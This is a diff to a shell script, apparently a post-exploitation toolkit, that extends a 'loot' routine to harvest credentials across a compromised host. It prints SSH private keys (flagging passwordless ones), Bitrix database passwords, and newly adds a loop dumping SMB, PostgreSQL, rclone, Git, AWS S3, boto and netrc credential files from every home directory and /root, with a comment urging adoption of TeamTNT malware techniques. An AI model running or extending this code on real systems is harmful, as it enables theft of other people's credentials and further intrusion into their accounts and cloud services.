@@ -424,7 +424,7 @@ loot_sshkey() {
     grep -Fqam1 'PRIVATE KEY' "${fn}" || return
 
     setsid -w ssh-keygen -y -f "${fn}" </dev/null &>/dev/null && str="${CDR}NO PASSWORD"
-    echo -e "${CB}SSH Key ${CDY}${fn}${CN} ${str}${CDY}${CF}"
+    echo -e "${CB}SSH-Key ${CDY}${fn}${CN} ${str}${CDY}${CF}"
     cat "$fn"
     echo -en "${CN}"
 }
@@ -433,11 +433,26 @@ loot_bitrix() {
     local fn="${1:?}"
     [ ! -f "$fn" ] && return
     grep -Fqam1 '$_ENV[' "$fn" && return
-    echo -e "${CB}Bitrix DB ${CDY}${fn}${CF}"
+    echo -e "${CB}Bitrix-DB ${CDY}${fn}${CF}"
     grep --color=never -E "(host|database|login|password)'.*=" "${fn}"
     echo -en "${CN}"
 }
 
+# _loot_home <NAME> <filename>
+_loot_homes() {
+    local fn
+    for fn in "${HOMEDIR:-/home}"/*/"${2:?}" /root/"${2}"; do
+        [ ! -s "$fn" ] && continue
+        echo -e "${CB}${1:-CREDS} ${CDY}${fn}${CF}"
+        cat "$fn"
+        echo -en "${CN}"
+    done
+}
+
+# Someone shall implement a sub-set from TeamTNT's tricks (use
+# noseyparker for cpu/time-intesive looting). TeamTNT's infos:
+# https://malware.news/t/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/71346
+# https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker
 loot() {
     local h="${_HS_HOME_ORIG:-$HOME}"
     local str
@@ -477,15 +492,17 @@ loot() {
         loot_sshkey "$fn"
     done
 
-    ### .config
-    for fn in "${HOMEDIR:-/home}"/*/.config/rclone/rclone.conf /root/.config/rclone/rclone.conf; do
-        [ ! -s "$fn" ] && continue
-        echo -e "${CB}rclone ${CDY}${fn}${CF}"
-        cat "$fn"
-        echo -en "${CN}"
-    done
-
-    HS_WARN "FIXME: This is ALPHA. Needs much more..."
+    _loot_homes "SMB"    ".smbcredentials"
+    _loot_homes "SMB"    ".samba_credentials"
+    _loot_homes "PGSQL"  ".pgpass"
+    _loot_homes "RCLONE" ".config/rclone/rclone.conf"
+    _loot_homes "GIT"    ".git-credentials"
+    _loot_homes "AWS S3" ".s3cfg"
+    _loot_homes "AWS S3" ".passwd-s3fs"
+    _loot_homes "AWS S3" ".s3backer_passwd"
+    _loot_homes "AWS S3" ".passwd-s3fs"
+    _loot_homes "AWS S3" ".boto"
+    _loot_homes "NETRC"  ".netrc"
 }
 
 ws() {
